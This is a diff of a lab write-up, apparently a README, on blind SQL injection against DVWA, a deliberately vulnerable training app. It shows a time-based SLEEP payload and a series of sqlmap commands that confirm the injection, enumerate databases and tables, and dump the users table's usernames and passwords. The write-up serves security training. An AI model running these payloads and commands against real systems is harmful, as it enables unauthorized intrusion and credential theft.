@@ -24,3 +24,92 @@ That becomes:
 SELECT first_name, last_name FROM users WHERE user_id = 1 AND SLEEP(5);
 This is a time-based blind SQL injection, and it works even though you escaped the input.
 ```
+
+Attackers able to intercept and modify POST data using sqlmap tool .
+
+You're targeting:
+
+```
+http://<ip>/DVWA/vulnerabilities/sqli_blind/
+```
+
+and the form sends a POST request with parameters like:
+
+```
+POST /DVWA/vulnerabilities/sqli_blind/ HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+id=1&Submit=Submit
+```
+
+You want to inject a payload into id that proves SQLi is possible — ideally a time-based blind SQLi.
+
+### Using sqlmap
+
+```
+sqlmap -u "http://<ip>/DVWA/vulnerabilities/sqli_blind/" \
+--data="id=1&Submit=Submit" \
+--cookie="security=medium; PHPSESSID=YOUR_SESSION_ID" \
+--technique=BT \
+--level=2 \
+--risk=2 \
+--batch
+```
+
+![image](https://github.com/user-attachments/assets/34b7fb18-ba9c-472b-84ba-e22b468c98c9)
+
+The injection point was confirmed on the id parameter (POST), which is vulnerable to both Boolean-based (id=1 AND 1682=1682) and Time-based (id=1 AND (SELECT SLEEP(5))) blind SQL injection; the backend uses MySQL (MariaDB fork) on Apache 2.4.63 running Debian Linux, and despite being set to Medium security, it is still injectable.
+
+Extract data from dvwa DB:
+
+```
+sqlmap -u "http://172.17.128.158/DVWA/vulnerabilities/sqli_blind/" \
+--data="id=1&Submit=Submit" \
+--cookie="security=medium; PHPSESSID=9214bb7c3ab25045944f51649562e453" \
+--dbs
+```
+
+![image](https://github.com/user-attachments/assets/c1c996df-594e-4f5d-8753-bb806893604c)
+
+Found Databases.
+
+Extract Table & User Info:
+
+```
+sqlmap -u "http://172.17.128.158/DVWA/vulnerabilities/sqli_blind/" \
+--data="id=1&Submit=Submit" \
+--cookie="security=medium; PHPSESSID=9214bb7c3ab25045944f51649562e453" \
+-D dvwa --tables
+```
+
+![image](https://github.com/user-attachments/assets/519e573b-d747-406e-9edf-c9be196d1315)
+
+Listed tables in dvwa.
+
+```
+sqlmap -u "http://172.17.128.158/DVWA/vulnerabilities/sqli_blind/" \
+--data="id=1&Submit=Submit" \
+--cookie="security=medium; PHPSESSID=9214bb7c3ab25045944f51649562e453" \
+-D dvwa -T users --columns
+```
+
+Then list columns in the users table.
+
+![image](https://github.com/user-attachments/assets/b8653499-fa81-467f-b511-9a710403f910)
+
+Then dump usernames and passwords:
+
+```
+sqlmap -u "http://172.17.128.158/DVWA/vulnerabilities/sqli_blind/" \
+--data="id=1&Submit=Submit" \
+--cookie="security=medium; PHPSESSID=9214bb7c3ab25045944f51649562e453" \
+-D dvwa -T users -C user,password --dump
+```
+
+![image](https://github.com/user-attachments/assets/782a129f-ae44-472a-a204-306fe512cdcf)
+ 
+The attack was successful
+
+
+
+
